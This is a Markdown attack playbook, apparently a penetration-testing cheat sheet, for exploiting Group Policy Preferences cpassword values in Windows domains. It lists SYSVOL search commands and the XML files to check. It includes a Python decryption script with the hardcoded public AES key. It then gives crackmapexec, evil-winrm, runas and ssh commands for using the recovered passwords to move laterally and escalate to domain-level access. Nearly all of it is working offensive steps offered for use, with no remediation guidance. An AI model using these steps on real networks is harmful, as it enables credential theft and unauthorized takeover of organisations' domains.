# Windows Privilege Escalation – GPP cpassword

## Purpose

This file provides a structured workflow for identifying and exploiting Group Policy Preferences (GPP) cpassword credentials.

Core rules:
- GPP stored passwords are encrypted, not secure
- The AES key is publicly known
- Any domain user can read SYSVOL
- Decrypted credentials often lead to domain compromise

---

## 0. Mental Model

GPP stores credentials in XML files inside SYSVOL.

Example:

cpassword="..."

This value:
- is NOT secure
- can be decrypted easily

→ gives plaintext credentials

---

## 1. Locate GPP Files (CRITICAL FIRST STEP)

Search SYSVOL:

dir \\<DOMAIN>\SYSVOL /s

OR:

dir \\<DC_IP>\SYSVOL /s

---

## 2. Common File Locations

Look for:

Groups.xml  
Services.xml  
ScheduledTasks.xml  
DataSources.xml  
Printers.xml  
Drives.xml  

---

## 3. Extract cpassword

Example:

type \\<DOMAIN>\SYSVOL\...\Groups.xml

Look for:

cpassword="..."

---

## 4. Decrypt cpassword

### Option 1: Using gpp-decrypt (preferred)

gpp-decrypt <cpassword>

---

### Option 2: Using Python

```python
from base64 import b64decode
from Crypto.Cipher import AES

key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8' \
      b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'

cpassword = b64decode("<cpassword>")
cipher = AES.new(key, AES.MODE_CBC, b"\x00"*16)
plaintext = cipher.decrypt(cpassword)
print(plaintext.decode('utf-16le').rstrip('\x00'))
```

---

## 5. Use Credentials

Try:

cmd:

runas /user:<DOMAIN>\user cmd

---

## 6. Lateral Movement

Test credentials:

crackmapexec smb <IP> -u user -p password
crackmapexec winrm <IP> -u user -p password

---

## 7. Remote Access

Try:

winrm:

evil-winrm -i <IP> -u user -p password

ssh (if enabled):

ssh user@<IP>

---

## 8. Check Privileges

whoami /priv
whoami /groups

---

## 9. Privilege Escalation Paths

Use credentials for:

- local admin access
- service accounts
- domain admin accounts
- file shares
- databases

---

## 10. Automate Search

PowerShell:

findstr /S /I cpassword \\<DOMAIN>\SYSVOL\*.xml

---

## 11. Common Failure Points

- wrong domain path
- incorrect cpassword extraction
- padding issues in decryption
- credentials no longer valid

---

## 12. If Stuck

- search entire SYSVOL again
- try multiple XML files
- verify domain name
- test credentials on multiple hosts

---

## 13. Quick Exploit Pattern

1. access SYSVOL
2. find XML files
3. extract cpassword
4. decrypt password
5. test credentials
6. move laterally / escalate

---

## 14. Mental Model

SYSVOL = shared secrets  
cpassword = weak encryption  
decryption = access  
credentials = control  

---

## 15. Golden Rules

- Always check SYSVOL in domain environments
- cpassword is always decryptable
- Test credentials everywhere
- This often leads to domain-level access